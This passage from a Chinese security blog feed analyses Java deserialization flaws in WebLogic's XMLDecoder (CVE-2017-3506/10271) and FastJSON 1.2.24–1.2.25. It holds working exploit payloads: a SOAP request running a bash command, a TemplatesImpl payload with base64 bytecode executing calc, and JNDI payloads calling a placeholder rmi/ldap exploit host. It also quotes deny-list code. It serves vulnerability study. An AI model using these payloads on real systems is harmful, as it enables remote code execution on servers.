alt="image-20211104193433518"></p><p>就这样 得到标签-&gt;实例化Handler-&gt;循环标签属性进行事件处理  ，直到解析到第一个末标签(EndElement)&lt;/string&gt;,便会执行StringElementHandler#getValueObject，返回被ValueObjectImpl.create处理过的标签内的值。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104203042115.png" alt="image-20211104203042115"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104203356887.png" alt="image-20211104203356887"></p><p>然后接下来会把这个ValueObjectImpl对象赋值到父标签对应的handler的属性里</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104211811441.png" alt="image-20211104211811441"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105025432694.png" alt="image-20211105025432694"></p><p>而解析到&lt;void index=&quot;0&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt; 的&lt;/void&gt; 时，会根据if逻辑判断这里void标签的作用，这里判断的void起到一个数组元素赋值的作用，于是便通过set方法往Array赋值。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105134901622.png" alt="image-20211105134901622"></p><p>在解析到&lt;void method=&quot;start&quot;&gt;&lt;/void&gt;的末标签&lt;/void&gt;时，它的逻辑是这样的，先获取父handler对应type的实例化对象，然后再对其使用start方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140017348.png" alt="image-20211105140017348"></p><p>如果我们跟进这个getContextBean就会来到这里，发现确实是调用链父handler即ObjectElementHandler的getValueObject</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140036168.png" alt="image-20211105140036168"></p><p>跟进看看父handler的getValueObject逻辑，发现确实是返回了一个new ProcessBuilder(“calc”).  calc字段在var5.argument中，截图中没有截出来。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140436181.png" alt="image-20211105140436181"></p><p>回到本handler，通过拼接，执行了new ProcessBuilder(“calc”).start(); 弹出计算器。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140826489.png" alt="image-20211105140826489"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>当xml数据传入到XMLDecoder.readObejct后经过一些处理会传入到scanDocument方法里，这个方法会循环解析XML标签并交由相应的Handler进行处理，且子标签的handler对父标签的handler由链表结构串联起来，所以每解析一个标签就会往这个链表结构增添新元素并进行一些事件处理。</p><p>从安全方面而言，便是攻击者通过传入恶意XML数据交由XMLDecoder进行解析，XMLDecoder会循环遍历XML数据并进行拼接处理，直到最后拼接出完整的恶意语句并执行。</p><h3 id="CVE-2017-3506-amp-CVE-2017-10271"><a href="#CVE-2017-3506-amp-CVE-2017-10271" class="headerlink" title="CVE-2017-3506&amp;CVE-2017-10271"></a>CVE-2017-3506&amp;CVE-2017-10271</h3><p>影响范围</p><ul><li>WebLogic 10.3.6.0</li><li>WebLogic 12.1.3.0</li><li>WebLogic 12.2.1.0</li><li>WebLogic 12.2.1.1</li><li>WebLogic 12.2.1.2</li></ul><p>该漏洞利用weblogic的wls-wsat组件对XML用XMLDecoder进行解析的功能，从而对其传入恶意XML数据造成反序列化攻击。</p><p>复现分析如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] wls-wsat组件路径：</span><br><span class="line"></span><br><span class="line">            &#x2F;wls-wsat&#x2F;CoordinatorPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;CoordinatorPortType11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;ParticipantPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;ParticipantPortType11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationRequesterPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationRequesterPortType1</span><br></pre></td></tr></table></figure><p>对weblogic路由   <a href="http://xxx:7001/wls-wsat/CoordinatorPortType">http://xxx:7001/wls-wsat/CoordinatorPortType</a> 发送如下数据包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">        &lt;java version&#x3D;&quot;1.8.0_131&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">          &lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">            &lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">                &lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">                &lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">                &lt;string&gt;touch &#x2F;tmp&#x2F;1234&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">            &lt;&#x2F;array&gt;</span><br><span class="line">          &lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">        &lt;&#x2F;java&gt;</span><br><span class="line">      &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>并修改content-type</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105162455106.png" alt="image-20211105162455106"></p><p>我这里直接在javaElementHandler#addAttribute 下断点然后观察堆栈信息<br>可以发现是WorkContextXmlInputAdapter#readUTF 处调用了xmlDecoder的readObject方法。我们的XML就这样传进去畅通无阻的进入了XMLDecoder的解析。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105153940400.png" alt="image-20211105153940400"></p><p>攻击结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105154839248.png" alt="image-20211105154839248"></p><p><code>CVE-2017-3506</code>修补方案为采用黑名单机制禁用了object标签，这简直不要太好绕，所以CVE-2017-10271来了。</p><p>这是黑名单校验的相关代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void validate(InputStream is) &#123;</span><br><span class="line">      WebLogicSAXParserFactory factory &#x3D; new WebLogicSAXParserFactory();</span><br><span class="line">      try &#123;</span><br><span class="line">         SAXParser parser &#x3D; factory.newSAXParser();</span><br><span class="line">         parser.parse(is, new DefaultHandler() &#123;</span><br><span class="line">            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">                  throw new IllegalStateException(&quot;Invalid context type: object&quot;);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; catch (ParserConfigurationException var5) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var5);</span><br><span class="line">      &#125; catch (SAXException var6) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var6);</span><br><span class="line">      &#125; catch (IOException var7) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>绕过就是把object标签改为void标签就行了，因为从代码层面来看，void和object的handler因为是父子类关系，所以逻辑是高度相同的。</p><p>CVE-2017-10271的补丁则是继续把黑名单补全，可见除了object，还有method，new，array等标签都被做了处理。<br>object，new，method标签直接被ban，void属性只能设置index，array的class只能设置为byte类型。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void validate(InputStream is) &#123;</span><br><span class="line">   WebLogicSAXParserFactory factory &#x3D; new WebLogicSAXParserFactory();</span><br><span class="line">   try &#123;</span><br><span class="line">      SAXParser parser &#x3D; factory.newSAXParser();</span><br><span class="line">      parser.parse(is, new DefaultHandler() &#123;</span><br><span class="line">         private int overallarraylength &#x3D; 0;</span><br><span class="line">         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;</span><br><span class="line">            if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:object&quot;);</span><br><span class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;new&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:new&quot;);</span><br><span class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;method&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:method&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;void&quot;)) &#123;</span><br><span class="line">                  for(int attClass &#x3D; 0; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     if(!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        throw new IllegalStateException(&quot;Invalid attribute for element void:&quot; + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</span><br><span class="line">                  String var9 &#x3D; attributes.getValue(&quot;class&quot;);</span><br><span class="line">                  if(var9 !&#x3D; null &amp;&amp; !var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;</span><br><span class="line">                     throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure><p>直接绕它的黑名单的话，有如下思路</p><p>“</p><p>使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手，且参数为基本类型：</p><ul><li>构造函数有写文件操作，文件名和内容可控，可以进行getshell。</li><li>构造函数有其他的反序列化操作，我们可以进行二次反序列化操作。</li><li>构造函数直接有执行命令的操作，执行命令可控。</li><li>有其它的可能导致rce的操作，比如表达式注入之类的。</li></ul><p>目前存在的利用链有：</p><ul><li>FileSystemXmlApplicationContext-RCE</li><li>UnitOfWorkChangeSet-RCE</li><li>ysoserial-jdk7u21-RCE</li><li>JtaTransactionManager-JNDI注入</li></ul><p>“</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先引用一下奇安信团队发出的weblogic历史漏洞图，可以发现以反序列化为主，反序列化问题主要来自XMLDecoder和T3协议&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://const27blog.oss-cn-beijing.aliyuncs.com/img/ima</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浅析FastJSON反序列化漏洞（1.2.24——1.2.68）</title>
    <link href="http://const27.com/2021/09/08/%E6%B5%85%E6%9E%90FastJSONF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://const27.com/2021/09/08/%E6%B5%85%E6%9E%90FastJSONF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-09-07T19:05:14.205Z</published>
    <updated>2021-09-07T19:04:32.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastJSON-简介"><a href="#FastJSON-简介" class="headerlink" title="FastJSON 简介"></a>FastJSON 简介</h1><p>FastJson 是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象。</p><p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a> 👈项目地址</p><p>“自2017年3月15日，fastjson官方主动爆出其在<code>1.2.24</code>及之前版本存在远程代码执行高危安全漏洞以来，各种新型绕过姿势层出不穷。“——c014</p><h1 id="FASTJSON咋用"><a href="#FASTJSON咋用" class="headerlink" title="FASTJSON咋用"></a>FASTJSON咋用</h1><p>答案：直接POM导入，方便地一批</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;version&gt;x.x.xx&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure><p>import com.alibaba.fastjson.JSON</p><p>fastjson有两种常见的处理JSON的方法</p><ul><li><code>JSON.toJSONString()</code>方法：可将对象转换成<code>JSON</code>字符串</li><li><code>JSON.parseObject()</code>方法：将<code>JSON</code>字符串转换成对象。</li></ul><p>下面看一波实例：创建一个对象，将其转为JSON，然后再转回对象。<br>同时可以发现，在JSON序列化时，会调用类的getxxx方法；在JSON反序列化时，会调用类的构造方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static class User&#123;</span><br><span class="line">        private String id;</span><br><span class="line">        User()&#123;</span><br><span class="line">            System.out.println(&quot;User go&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        public void setId(String ids)&#123;</span><br><span class="line">            System.out.println(&quot;setId go&quot;);</span><br><span class="line">            this.id&#x3D;ids;</span><br><span class="line">        &#125;</span><br><span class="line">        public String getId()&#123;</span><br><span class="line">            System.out.println(&quot;GetId go&quot;);</span><br><span class="line">            return this.id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        User a &#x3D; new User();</span><br><span class="line">        String json &#x3D; JSON.toJSONString(a);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(JSON.parseObject(json,User.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User go</span><br><span class="line">GetId go</span><br><span class="line">&#123;&#125;</span><br><span class="line">User go</span><br><span class="line">org.example.App$User@36d4b5c</span><br></pre></td></tr></table></figure><h1 id="FASTJSON-反序列化漏洞起源"><a href="#FASTJSON-反序列化漏洞起源" class="headerlink" title="FASTJSON 反序列化漏洞起源"></a>FASTJSON 反序列化漏洞起源</h1><p>我们可以看到，把JSON反序列化的语句是 JSON.parseObject(json,User.class)，在指定JSON时，还需要指定其所属的类，显得代码就很臃肿，所以开发人员可以使用@type(autotype)字符段来使其不那么臃肿。<br>像下面这样，在JSON通过指定@type的值来实现定位某类。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure><p>虽说这么做很方便，但是以这种方法进行反序列化，会执行类的构造方法和属性相关的get，set方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static class User&#123;</span><br><span class="line">        private String id;</span><br><span class="line">        User()&#123;</span><br><span class="line">            System.out.println(&quot;User go&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        public void setId(String ids)&#123;</span><br><span class="line">            System.out.println(&quot;setId go&quot;);</span><br><span class="line">            this.id&#x3D;ids;</span><br><span class="line">        &#125;</span><br><span class="line">        public String getId()&#123;</span><br><span class="line">            System.out.println(&quot;GetId go&quot;);</span><br><span class="line">            return this.id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        System.out.println(JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User go</span><br><span class="line">setId go</span><br><span class="line">GetId go</span><br><span class="line">&#123;&quot;id&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>所以在这个JSON反序列化接口处，我们传入恶意的JSON，就可以调用任意类的构造方法以及属性相关的get，set方法。<br>如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意JSON达到RCE的作用。</p><p>另外，JSON.parseObject(“{&quot;@type&quot;:&quot;org.example.App$User&quot;,&quot;id&quot;:&quot;123&quot;}”,Feature.SupportNonPublicField) ，可以直接为private成员赋值（不加Feature.SupportNonPublicField是无法对private成员赋值的）</p><h1 id="各版本复现"><a href="#各版本复现" class="headerlink" title="各版本复现"></a>各版本复现</h1><h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>是的，就是7U21链里面的TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p><p>这个类本身就存在反序列化漏洞，会将成员变量_bytecodes的数据作为类的字节码进行newInsantce操作从而调用其构造方法或static块。故可以fastjson为契机去调用此类。<br>但是由于_name 和_bytecodes 是私有属性，所以需要FASTJSON反序列化接口有Feature.SupportNonPublicField参数才能实现，利用条件很苛刻，但是条件允许的话就很方便，payload打过去就完事。</p><p>“<em>_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。</em>“</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],</span><br><span class="line">  &quot;_name&quot; : &quot;a&quot;,</span><br><span class="line">  &quot;_tfactory&quot; : &#123;&#125;,</span><br><span class="line">  &quot;outputProperties&quot; : &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_bytecodes的类长这样,编译生成Evil.class，将字节码读出并用base64加密，作为_bytecodes</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class Evil extends AbstractTranslet&#123;</span><br><span class="line">static &#123;</span><br><span class="line">            System.err.println(&quot;Pwned&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                String[] cmd &#x3D; &#123;&quot;calc&quot;&#125;;</span><br><span class="line">                java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">            &#125; catch ( Exception e ) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         @Override</span><br><span class="line">         public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException &#123;</span><br><span class="line">                  &#x2F;&#x2F; anything</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         @Override</span><br><span class="line">         public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException &#123;</span><br><span class="line">                  &#x2F;&#x2F; anything</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a><strong>JdbcRowSetImpl</strong></h3><p><strong>com.sun.rowset.JdbcRowSetImpl</strong>,通过JNDI注入来实现RCE。但需注意JNDI注入有JDK版本限制，高版本需要进行绕过。</p><p>我们的payload一般长这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;ip:port&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">or</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ip:1099&#x2F;exp&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>把这个payload打过去，会执行setAutoCommit()，又setAutoCommit()执行了connct()函数，其如下。<br>connect()会对dataSourceName属性进行一个InitialContext.lookup(dataSourceName),从而实现JNDI注入。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private Connection connect() throws SQLException &#123;</span><br><span class="line">        if(this.conn !&#x3D; null) &#123;</span><br><span class="line">            return this.conn;</span><br><span class="line">        &#125; else if(this.getDataSourceName() !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                InitialContext var1 &#x3D; new InitialContext();</span><br><span class="line">                DataSource var2 &#x3D; (DataSource)var1.lookup(this.getDataSourceName());</span><br><span class="line">                return this.getUsername() !&#x3D; null &amp;&amp; !this.getUsername().equals(&quot;&quot;)?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection();</span><br><span class="line">            &#125; catch (NamingException var3) &#123;</span><br><span class="line">                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return this.getUrl() !&#x3D; null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h2><h3 id="更新机制"><a href="#更新机制" class="headerlink" title="更新机制"></a>更新机制</h3><p>1.2.24及以前版本就跟白纸一样随便打，在1.2.25开始加入了黑白名单机制</p><p>我们继续用1.2.24的payload（这里用TemplatesImpl的payload）去打，会发现报错autotype不支持</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907163503833.png" alt="image-20210907163503833"></p><p>究其原因，是因为在com.alibaba.fastjson.parser.ParserConfig 加入了CheckAutoType方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig !public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass)</span><br></pre></td></tr></table></figure><p><strong>在其中有个autotypesupport属性，如果为false，那么就会检测json中@type的值 开头是否与黑名单中的值一样，若一样就直接返回一个异常，然后加载白名单中的类</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!autoTypeSupport) &#123;</span><br><span class="line">\\黑名单检测，classname是传入类的全名，denyList是黑名单</span><br><span class="line">            for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny &#x3D; denyList[i];</span><br><span class="line">                if (className.startsWith(deny)) &#123;</span><br><span class="line">                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept &#x3D; acceptList[i];</span><br><span class="line">                if (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    return clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907164922626.png" alt="image-20210907164922626">黑名单长这样</p><p><strong>若autotypesupport开启，则会先白名单加载，后黑名单检测</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        String accept &#x3D; acceptList[i];</span><br><span class="line">        if (className.startsWith(accept)) &#123;</span><br><span class="line">            return TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">        String deny &#x3D; denyList[i];</span><br><span class="line">        if (className.startsWith(deny)) &#123;</span><br><span class="line">            throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面的许多更新都是对checkAutotype以及本身某些逻辑缺陷导致的漏洞进行修复，以及黑名单的不断增加。</p><h3 id="bypass-1（L-法）1-2-25-1-2-41"><a href="#bypass-1（L-法）1-2-25-1-2-41" class="headerlink" title="bypass 1（L;法）1.2.25-1.2.41"></a>bypass 